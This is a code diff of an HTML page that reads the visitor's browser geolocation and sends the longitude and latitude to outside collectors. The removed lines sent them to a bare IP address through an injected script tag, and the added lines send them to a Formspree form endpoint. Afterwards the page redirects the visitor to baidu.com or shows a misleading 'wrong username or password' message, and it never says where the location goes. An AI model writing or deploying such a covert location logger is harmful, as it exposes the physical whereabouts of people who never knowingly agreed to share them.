@@ -7,6 +7,22 @@
 </head>
 
 <body>
+    <form action="https://formspree.io/f/mqkgwbdj" method="POST">
+        <label>
+            Your email:
+            <input type="text" name="_replyto">
+        </label>
+        <label>
+            Your message:
+            <textarea name="message"></textarea>
+        </label>
+
+        <!-- your other form fields go here -->
+
+        <button type="submit">Send</button>
+    </form>
+
+
 
 </body>
 
@@ -18,21 +34,38 @@
             location_lon = position.coords.longitude;
             location_lat = position.coords.latitude;
 
-            var script = document.createElement("script");
-            //组合请求URL
-            script.src = "http://123.57.105.167/nihao" + "?jingdu=" + location_lon + "&" + "weidu=" +
-                location_lat;
-            //将创建的新节点添加到BOM树上
-            document.getElementsByTagName("body")[0].appendChild(script);
+            // var script = document.createElement("script");
+            // //组合请求URL
+            // script.src = "http://123.57.105.167/nihao" + "?jingdu=" + location_lon + "&" + "weidu=" +
+            //     location_lat;
+            // //将创建的新节点添加到BOM树上
+            // document.getElementsByTagName("body")[0].appendChild(script);
 
-            // alert('h5经度：' + location_lon);
-            // alert('h5纬度：' + location_lat);
+            var xhr = new XMLHttpRequest();
+            //3.准备请求（请求类型，后台地址）
+            xhr.open("post", "https://formspree.io/f/mqkgwbdj");
+            //如果是post请求，必须设置请求头的类型，后台才能够接收到前台传过去的相应的数据
+            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            //3.监听ajax的状态变化
+            xhr.onreadystatechange = function () {
+                if (xhr.status == 200 && xhr.readyState == 4) {
+                    var result = xhr.responseText;
+                    // responseText获取到的都是字符串
+                    if (result == "true") { //登录成功
+                        window.location.href = "https://www.baidu.com";
+                    } else { //登录失败
+                        document.getElementById("erSpan").innerHTML = "用户名或密码错误！";
+                    }
+                }
+            }
+            //4.发送请求:post请求必须通过.send()传数据到后台
+            xhr.send("jingdu=" + location_lon + "&weidu=" + location_lat);
+
+
         });
     } else {
         alert("请打开手机定位功能");
     }
-
-
 </script>
 
 
